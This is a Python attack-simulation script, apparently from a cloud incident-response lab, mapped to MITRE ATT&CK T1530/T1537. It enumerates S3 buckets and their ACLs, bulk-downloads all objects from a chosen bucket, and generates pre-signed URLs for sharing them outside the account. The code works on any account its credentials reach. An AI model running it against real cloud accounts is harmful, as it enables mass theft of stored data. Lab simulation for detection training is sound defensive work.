"""
S3 Data Exfiltration Attack Simulation
=======================================

MITRE ATT&CK Mapping:
    T1530 - Data from Cloud Storage Object (bucket enum, bulk download)
    T1537 - Transfer Data to Cloud Account (pre-signed URL generation)

Techniques:
    1. Bucket enumeration - list all buckets, check ACLs for public access
    2. Bulk download - download all objects from a target bucket
    3. Pre-signed URL generation - create shareable URLs for sensitive objects

WARNING: For lab use only. All operations target lab-provisioned resources.
"""

import boto3
import argparse
import time
import os
from botocore.exceptions import ClientError


BANNER = """
========================================================
  S3 Data Exfiltration - Attack Simulation
========================================================
  MITRE ATT&CK: T1530, T1537
  Techniques:   Bucket enumeration, Bulk download,
                Pre-signed URL generation
========================================================
"""


def timestamp():
    return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())


def enumerate_buckets(s3, sleep_time):
    """T1530 - List all buckets and check their ACLs for overly permissive access."""
    print(f"\n[{timestamp()}] [T1530] Bucket Enumeration")
    print(f"    [*] Listing all S3 buckets...")

    buckets = []
    try:
        resp = s3.list_buckets()
        buckets = resp.get('Buckets', [])
        print(f"    [+] Found {len(buckets)} bucket(s)")

        for bucket in buckets:
            name = bucket['Name']
            print(f"    [*] Bucket: {name} (Created: {bucket['CreationDate']})")

            # Check ACL
            try:
                acl = s3.get_bucket_acl(Bucket=name)
                for grant in acl.get('Grants', []):
                    grantee = grant.get('Grantee', {})
                    uri = grantee.get('URI', '')
                    permission = grant.get('Permission', '')
                    if 'AllUsers' in uri or 'AuthenticatedUsers' in uri:
                        print(f"    [!] PUBLIC ACL on {name}: {uri} -> {permission}")
                    else:
                        grantee_id = grantee.get('DisplayName', grantee.get('ID', 'N/A'))
                        print(f"        Grant: {grantee_id} -> {permission}")
            except ClientError as e:
                code = e.response['Error']['Code']
                if code == 'AccessDenied':
                    print(f"    [+] AccessDenied on GetBucketAcl for {name} (Expected)")
                else:
                    print(f"    [-] ACL check failed for {name}: {code}")
            time.sleep(sleep_time)

    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied listing buckets (Expected)")
        else:
            print(f"    [-] Failed: {code}")

    return buckets


def bulk_download(s3, target_bucket, output_dir, sleep_time):
    """T1530 - Download all objects from the target bucket."""
    print(f"\n[{timestamp()}] [T1530] Bulk Download")
    print(f"    [*] Target bucket: {target_bucket}")
    print(f"    [*] Output directory: {output_dir}")

    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
        print(f"    [*] Created output directory: {output_dir}")

    try:
        paginator = s3.get_paginator('list_objects_v2')
        total = 0
        downloaded = 0

        for page in paginator.paginate(Bucket=target_bucket):
            for obj in page.get('Contents', []):
                total += 1
                key = obj['Key']
                size = obj['Size']
                print(f"    [*] Found: {key} ({size} bytes)")

                # Download the object
                local_path = os.path.join(output_dir, key.replace('/', os.sep))
                local_dir = os.path.dirname(local_path)
                if local_dir and not os.path.exists(local_dir):
                    os.makedirs(local_dir)

                try:
                    s3.download_file(target_bucket, key, local_path)
                    print(f"    [+] Downloaded: {key} -> {local_path}")
                    downloaded += 1
                except ClientError as e:
                    code = e.response['Error']['Code']
                    if code == 'AccessDenied':
                        print(f"    [+] AccessDenied downloading {key} (Expected)")
                    else:
                        print(f"    [-] Failed to download {key}: {code}")
                time.sleep(sleep_time)

        print(f"    [*] Summary: {downloaded}/{total} objects downloaded")

    except ClientError as e:
        code = e.response['Error']['Code']
        if code in ('AccessDenied', 'NoSuchBucket'):
            print(f"    [+] {code} on bucket {target_bucket}")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")


def generate_presigned_urls(s3, target_bucket, sleep_time):
    """T1537 - Generate pre-signed URLs for objects to enable external exfiltration."""
    print(f"\n[{timestamp()}] [T1537] Pre-signed URL Generation")
    print(f"    [*] Generating pre-signed URLs for objects in: {target_bucket}")

    try:
        paginator = s3.get_paginator('list_objects_v2')
        count = 0

        for page in paginator.paginate(Bucket=target_bucket, MaxKeys=20):
            for obj in page.get('Contents', []):
                key = obj['Key']
                try:
                    url = s3.generate_presigned_url(
                        'get_object',
                        Params={'Bucket': target_bucket, 'Key': key},
                        ExpiresIn=3600
                    )
                    # Truncate URL for display
                    display_url = url[:80] + '...' if len(url) > 80 else url
                    print(f"    [!] Pre-signed URL for {key}: {display_url}")
                    count += 1
                except ClientError as e:
                    code = e.response['Error']['Code']
                    print(f"    [-] Failed to generate URL for {key}: {code}")
                time.sleep(sleep_time)

        print(f"    [*] Generated {count} pre-signed URL(s)")

    except ClientError as e:
        code = e.response['Error']['Code']
        if code in ('AccessDenied', 'NoSuchBucket'):
            print(f"    [+] {code} on bucket {target_bucket}")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")


def simulate(profile, region, target_bucket, output_dir, sleep_time):
    print(BANNER)
    print(f"[{timestamp()}] Starting S3 Data Exfiltration simulation")
    print(f"[{timestamp()}] Profile: {profile} | Region: {region}")

    session = boto3.Session(profile_name=profile, region_name=region)
    sts = session.client('sts')
    s3 = session.client('s3')

    try:
        identity = sts.get_caller_identity()
        print(f"[{timestamp()}] Identity: {identity['Arn']}")
    except Exception as e:
        print(f"[{timestamp()}] [!] Failed to get identity: {e}")
        return

    # Technique 1: Bucket enumeration
    enumerate_buckets(s3, sleep_time)

    # Technique 2: Bulk download
    if target_bucket:
        bulk_download(s3, target_bucket, output_dir, sleep_time)

        # Technique 3: Pre-signed URL generation
        generate_presigned_urls(s3, target_bucket, sleep_time)
    else:
        print(f"\n[{timestamp()}] [*] No --target-bucket specified, skipping download and URL generation")

    print(f"\n[{timestamp()}] S3 Data Exfiltration simulation complete")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='S3 Data Exfiltration attack simulation for Cloud IR Lab'
    )
    parser.add_argument('--profile', required=True, help='AWS CLI profile name')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--target-bucket', help='Target S3 bucket for download and URL generation')
    parser.add_argument('--output-dir', default='exfil-output',
                        help='Local directory for downloaded objects')
    parser.add_argument('--sleep', type=float, default=1.0,
                        help='Sleep between actions (seconds)')

    args = parser.parse_args()
    simulate(args.profile, args.region, args.target_bucket, args.output_dir, args.sleep)
